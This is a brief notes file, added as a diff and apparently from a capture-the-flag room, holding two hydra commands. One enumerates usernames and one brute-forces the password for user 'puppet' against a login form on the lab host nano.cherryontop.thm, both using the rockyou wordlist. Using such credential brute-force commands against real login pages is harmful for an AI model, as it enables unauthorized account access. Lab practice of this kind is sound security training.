@@ -1,0 +1,8 @@
+Getting Molly dashbasord username:
+
+hydra -L /usr/share/wordlists/rockyou.txt -p ja nano.cherryontop.thm http-post-form "/login.php:username=^USER^&password=^PASS^&submit=:This user doesn" -f -V
+
+Brute forcing Mally dashboard password:
+
+hydra -l puppet -P /usr/share/wordlists/rockyou.txt  nano.cherryontop.thm http-post-form "/login.php:username=^USER^&password=^PASS^&submit=:Bad password" -f -V
+  
